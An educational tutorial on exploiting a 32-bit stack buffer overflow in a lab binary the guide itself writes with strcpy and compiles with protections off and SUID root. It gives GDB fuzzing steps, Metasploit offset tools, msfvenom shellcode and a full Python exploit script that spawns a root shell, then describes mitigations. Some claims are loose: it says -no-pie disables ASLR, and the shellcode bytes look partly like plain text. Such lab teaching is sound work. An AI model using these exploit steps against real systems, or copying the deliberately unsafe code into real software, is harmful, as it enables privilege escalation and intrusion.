# Binary Exploitation: A Practical Guide to Buffer Overflows 💥

This guide provides a comprehensive overview and a practical, step-by-step methodology for understanding, identifying, and exploiting a classic stack-based buffer overflow.

**Disclaimer:** This is for educational and ethical research purposes only. The techniques described should only be performed on systems you own or have explicit permission to test. This example uses a simplified 32-bit binary with modern protections disabled to clearly demonstrate the core concepts.

---

### ## 1. Understanding the Vulnerability

A **buffer overflow** is a vulnerability that occurs when a program attempts to write more data into a fixed-size block of memory (a "buffer") than it can hold. This overflow can corrupt adjacent memory, and if done carefully, can overwrite critical program data like the **return address**.

The return address is a pointer on the stack that tells a function where to return to after it has finished executing. By overwriting this address, an attacker can hijack the program's execution flow and redirect it to their own malicious code (**shellcode**).

---

### ## 2. The Setup: Creating a Vulnerable Environment

To learn, we must first create a controlled, vulnerable environment.

#### **A. The Vulnerable Program (`vuln.c`)**
This simple C program uses the unsafe `strcpy` function, which does not perform bounds checking and is the source of our vulnerability.

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[100];
    // VULNERABLE LINE: strcpy does not check the size of the input.
    strcpy(buffer, input);
}

int main(int argc, char **argv) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

#### **B. Compilation (Disabling Protections)**

We compile the code as a 32-bit binary and disable modern security features that would otherwise prevent this classic exploit.

```bash
# -m32: Compile as 32-bit
# -fno-stack-protector: Disables stack canaries
# -z execstack: Makes the stack executable (disables NX/DEP)
# -no-pie: Disables Position-Independent Executable (turns off ASLR)
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vuln vuln.c

# Set the SUID bit to simulate a privileged binary
sudo chown root:root vuln
sudo chmod u+s vuln
```

#### **C. Required Tools**

* **GDB:** The GNU Debugger. We'll use an enhancement like GEF, PEDA, or Pwndbg for better readability.
* **Python:** For scripting and generating payloads.

---

## 3. The Methodology: From Crash to Shell

This is the step-by-step process to find and exploit the vulnerability.

### **Step 1: Fuzzing to Find the Crash**

First, confirm the program is vulnerable by sending it a long string of characters and verifying that we can control the instruction pointer (EIP).

**Procedure:**

1.  Start the program within GDB.
    ```bash
    gdb ./vuln
    ```
2.  Run the program with a long string of 'A's (hex 0x41).
    ```
    (gdb) run $(python -c 'print("A" * 300)')
    ```
3.  Analyze the crash.
    ```
    Program received signal SIGSEGV, Segmentation fault.
    0x41414141 in ?? ()

    (gdb) info registers eip
    eip            0x41414141      0x41414141
    ```

**Result:** The EIP register now contains `0x41414141`. This confirms we have control over the program's execution flow.

### **Step 2: Finding the Exact Offset**

Now, we need to find the exact number of bytes required to overwrite the EIP. We do this using a unique, non-repeating pattern.

**Procedure:**

1.  Generate a unique pattern of 300 bytes.
    ```bash
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
    # Output: Aa0Aa1Aa2...
    ```
2.  Run the program in GDB with this unique pattern.
    ```
    (gdb) run Aa0Aa1Aa2...
    ```
3.  The program will crash. Note the value in the EIP register (e.g., `0x61413461`).
4.  Calculate the offset using the EIP value.
    ```bash
    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x61413461
    # Output: [*] Exact match at offset 112
    ```

**Result:** We now know that the EIP is overwritten starting at byte 112.

### **Step 3: Generating Shellcode**

Shellcode is a small piece of machine code that performs an action, typically spawning a shell (`/bin/sh`).

**Command (msfvenom):**

```bash
# Generate 32-bit Linux shellcode to spawn /bin/sh, avoiding null bytes
msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00' -f python
# Output:
# buf =  b""
# buf += b"\xdb\xcb\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x0b..."
```

### **Step 4: Building and Executing the Final Exploit**

We assemble a final payload with the structure: `JUNK + NEW_EIP + NOP_SLED + SHELLCODE`.

* **JUNK:** 112 bytes of padding to reach the return address.
* **NEW_EIP:** The address we want to jump to. This should point to our NOP Sled on the stack. We can find a suitable stack address using GDB (`info frame`).
* **NOP Sled:** A series of "No-Operation" instructions (`\x90`) that act as a landing strip.
* **SHELLCODE:** The machine code generated in Step 3.

**Exploit Script (`exploit.py`):**

```python
import struct

# 1. Find the offset (we found 112)
junk = b"A" * 112

# 2. Find a return address. Run 'info frame' in GDB after a crash.
#    Let's assume we find a good address at 0xffffd6a0
new_eip = struct.pack("<I", 0xffffd6a0)

# 3. Create a NOP sled
nops = b"\x90" * 32

# 4. Add the shellcode from msfvenom
shellcode = b"\xdb\xcb\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x0b\x83\xeb\xfc\x31\x53\x13\x03\x70\x05\x06\xe3\x08\x91\x34\x51\x70\x9b\x01\x64\x7a\x6b\xca\x07\x07\x1c\x26\x91\x2c\x41\x59\xbd\x95\xc2\xde\xcd\x05\x18\x70\xc3\x25\x05\x0e\x6b\x8f\x8d\x46\x37\x96\x60\xf3\x11\x5a\x27\x5e\x15\x4a\x91\x4a\x0c\x82\x04\x40\x12\x7b\x2f\x62\x69\x6e\x2f\x73\x68"

# 5. Combine and print the payload
payload = junk + new_eip + nops + shellcode
print(payload.decode('latin-1'))
```

**Execution:**

```bash
# Run the vulnerable program with the output of our script as the argument
./vuln "$(python exploit.py)"

# If successful, you will have a new shell!
$ whoami
root
```

---

## 4. Modern Mitigations

Modern systems are protected against this classic attack. Understanding these defenses is key to secure coding.

* **Stack Canaries:** A secret value placed on the stack before the return address. If this value is changed by an overflow, the program safely aborts.
* **ASLR (Address Space Layout Randomization):** Randomizes the memory locations of the stack, libraries, and heap, making it difficult for an attacker to know what address to jump to.
* **DEP/NX Bit (Data Execution Prevention / No-Execute):** Marks memory regions like the stack as non-executable. Even if an attacker redirects EIP to the stack, the CPU will refuse to execute the shellcode. This defense led to more advanced techniques like Return-Oriented Programming (ROP).
